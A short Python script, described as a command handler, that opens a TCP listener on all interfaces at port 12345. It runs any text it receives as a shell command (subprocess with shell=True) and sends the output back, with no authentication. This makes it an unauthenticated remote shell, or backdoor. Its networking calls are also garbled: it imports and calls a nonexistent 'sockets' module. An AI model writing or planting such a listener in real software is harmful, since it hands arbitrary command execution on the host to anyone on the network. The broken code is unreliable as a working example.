import sockets
import subprocess
import json
import logging

# Configure logging
logging.basicConfig(filename='command_handler.log', level=logging.INFO)

# Define the listening address and port
HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 12345  # Choose a port for communication

def main():
    # Create a sockets and bind it to the specified address and port
    server_sockets = sockets.sockets(sockets.AF_INET, sockets.SOCK_STREAM)
    server_sockets.bind((HOST, PORT))
    
    # Listen for incoming connections
    server_sockets.listen(5)
    
    logging.info(f"Listening on {HOST}:{PORT}")
    
    while True:
        # Accept incoming connections
        client_sockets, addr = server_sockets.accept()
        logging.info(f"Accepted connection from {addr[0]}:{addr[1]}")
        
        while True:
            # Receive data from the client
            data = client_sockets.recv(1024).decode('utf-8')
            
            if not data:
                break  # No more data, break the loop
            
            # Execute the received command and capture the output
            result = execute_command(data)
            
            # Send the command output back to the client
            client_sockets.send(json.dumps({"status": "success", "output": result}).encode('utf-8'))
            
            # Log the executed command and result
            logging.info(f"Executed command: {data}, Result: {result}")
        
        # Close the client sockets
        client_sockets.close()

def execute_command(command):
    try:
        # Execute the command using the subprocess module
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output
    except Exception as e:
        error_message = str(e)
        logging.error(f"Error executing command: {error_message}")
        return error_message

if __name__ == "__main__":
    main()
